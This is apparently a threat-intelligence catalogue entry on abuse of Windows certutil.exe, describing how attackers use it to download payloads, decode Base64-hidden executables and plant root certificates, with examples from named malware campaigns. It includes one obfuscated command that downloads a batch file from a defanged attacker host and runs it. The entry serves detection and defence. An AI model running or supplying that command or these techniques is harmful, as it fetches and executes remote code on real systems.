name: Certutil.exe
description: Command-line utility that can be used to obtain certificate authority information and configure Certificate Services.
summary: Download files from a given URL
Decode binaries hidden inside certificate files as Base64 information
Install browser root certificates as a precursor to performing Adversary-in-the-Middle

associated_commands.intent: Download 2.exe, a VMProtected Meterpreter downloader that fetches Cobalt Strike BEACON shellcode.
Decode a Base64 text file into an Active Directory scanner before running it.
Install the attacker's root certificate so Retefe can intercept HTTPS traffic to banking sites.
Download and run a payload, triggered by hidden DDE instructions in a weaponized document.
Download a payload disguised as 1.pdf from the attackers' server and start it.
Decode the PEM files dropped by the macro into the UPPERCUT backdoor's components.
The attackers issue this downloader command en masse to targeted computers, which download the Netwalker ransomware executable as a payload.
The ISMAgent trojan is disguised as a base64 digital certificate and decoded via certutil.exe.
The attackers passed the certutil utility to cmd to download radm.exe, which they then executed.
A second version of the infecting document embeds a .BAT file that downloads and runs a second-stage malware (debug.exe).
In some cases the attackers used certutil.exe to download Gelsemine, the first stage of Gelsemium.
A scheduled task created by the macro runs Certutil to decode the base64 data in Base.txt into IntelSecurityAssistManager.exe.
The attackers write the Base64 payload in chunks to C:\dns.txt and launch certutil with -decode to convert it into an .exe file.
After decoding the payload, the attackers launch certutil again with -hashfile, then copy and move the decoded dns.exe.
GammaSteel uses certutil.exe to get the MD5 of the exfiltrated file and possibly store it as a file.
The threat actors echoed base64 data into bigfile.txt over xp_cmdshell and used certutil to decode it into a privilege escalation executable.

associated_commands.command: C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f https://881.000webhostapp[.]com/1.txt && ren 1.txt 1.bat && 1.bat && exit
associated_commands.intent: After the decoy document opens, this obfuscated command downloads and executes a remote file via the built-in certutil utility.
The retrieved script checks the operating system and downloads the payload again with certutil; the payload is base64 that certutil decodes into a CAB file.
In the retrieved script, the downloaded base64 payload is decoded by certutil into a CAB file that is then unpacked.
The Bl00dy ransomware group used this command to download and execute their ransomware payload after exploiting ScreenConnect.
